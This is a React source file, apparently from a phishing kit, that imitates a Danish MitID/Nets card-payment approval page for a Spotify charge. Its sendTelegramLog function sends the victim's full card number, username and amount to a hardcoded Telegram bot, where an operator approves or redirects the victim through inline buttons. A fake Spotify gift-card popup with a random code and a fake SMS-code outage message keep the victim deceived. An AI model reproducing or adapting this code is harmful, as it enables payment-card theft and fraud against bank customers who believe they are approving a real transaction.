import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './NextStepAppr.css';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';
import visaLogo from '../assets/visa-logo.png';

const netsLogo = '/Nets_logo.svg';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function NextStepAppr() {
  const { t, language, toggleLanguage } = useLanguage();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');
  const [amount, setAmount] = useState('0.00');
  const [merchant, setMerchant] = useState('Spotify ');

  // Gift Card Popup states
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');

  // Message states
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState('');

  // Generate random Spotify gift card code
  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  // Handle Success button from Telegram
  const handleSuccessCard = () => {
    console.log('✅ Success button clicked - Showing Gift Card!');
    setIsConfirmed(false);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const closeGiftCard = () => {
    setShowGiftCard(false);
    sessionStorage.setItem('showCardForm', 'true');
    window.location.href = '/#/';
  };

  const handleCancel = () => {
    console.log('❌ Cancel clicked');
    window.location.href = '/#/';
  };

  const handleSmsCode = () => {
    const msg = document.createElement('div');
    msg.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:14px 28px;border-radius:500px;z-index:9999;font-family:Arial;font-size:14px;';
    msg.textContent = language === 'da' 
      ? 'SMS+kode er midlertidigt utilgængeligt' 
      : 'SMS+Code is temporarily unavailable';
    document.body.appendChild(msg);
    setTimeout(() => msg.remove(), 3000);
  };

  // Polling for Telegram callbacks
  useEffect(() => {
    let lastUpdateId = 0;
    
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              console.log('📨 NextStepAppr received:', callbackData);
              
              if (callbackData.startsWith('success_card_')) {
                handleSuccessCard();
              } else if (callbackData.startsWith('back_to_appr_')) {
                window.location.href = '/#/';
              } else if (callbackData.includes('block_')) {
                window.location.href = '/#/blocked';
              }
              
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: '✅ Action executed!'
              });
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  // Load card data
  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    const storedAmount = sessionStorage.getItem('amount');
    
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) setUsername(storedUsername);
    if (storedBankName) setBankName(storedBankName);
    if (storedBrand) setCardBrand(storedBrand);
    if (storedAmount) setAmount(storedAmount);
    
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>MITID APPROVAL REQUEST</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
💰 <b>Amount:</b> ${amount} DKK
🏪 <b>Merchant:</b> ${merchant}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> Waiting for MitID approval
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;

      const keyboard = {
        inline_keyboard: [
          [{ text: "✅ Approve (Godkend)", callback_data: `success_card_${Date.now()}` }],
          [{ text: "⬅️ Back", callback_data: `back_to_appr_${Date.now()}` }]
        ]
      };

      await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending:', error);
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsSending(true);
    const sent = await sendTelegramLog();
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    }
    setIsSending(false);
  };

  // Show waiting page after confirmation
  if (isConfirmed) {
    return (
      <div className="mitid-waiting-container">
        <div className="mitid-waiting-card">
          <div className="mitid-spinner"></div>
          <h2>Venter på godkendelse...</h2>
          <p>Transaktion godkendt</p>
          <p className="mitid-small">Du bliver omdirigeret...</p>
        </div>
        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </div>
    );
  }

  // Main MitID approval page
  return (
    <div className="mitid-overlay">
      <div className="mitid-wrapper">
        {/* Header with Nets and Visa logos */}
        <div className="mitid-header">
          <div className="mitid-header-left">
            <img src={netsLogo} alt="Nets" className="nets-logo-image" />
          </div>
          <div className="mitid-header-right">
            <img src={visaLogo} alt="VISA" className="visa-logo-image" />
          </div>
        </div>

        {/* Transaction info */}
        <div className="mitid-transaction-info">
          Betal {amount} DKK til {merchant}
        </div>

        {/* MitID approval section */}
        <div className="mitid-approval-section">
          <p className="mitid-title">Åbn MitID app og godkend</p>
          
          {/* Your SVG animation */}
          <div className="mitid-phone-animation">
            <object 
              type="image/svg+xml" 
              data="/code-app-slider-emulator.svg"
              className="mitid-phone-img"
            >
              <img src="/code-app-slider-emulator.svg" alt="MitID app" />
            </object>
          </div>
        </div>

        {/* Buttons */}
        <div className="mitid-buttons">
          <button className="mitid-btn mitid-btn-secondary" onClick={handleCancel}>
            Afbryd
          </button>
          <button className="mitid-btn mitid-btn-primary" onClick={handleSmsCode}>
            SMS+kode
          </button>
        </div>
      </div>

      {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
    </div>
  );
}

export default NextStepAppr;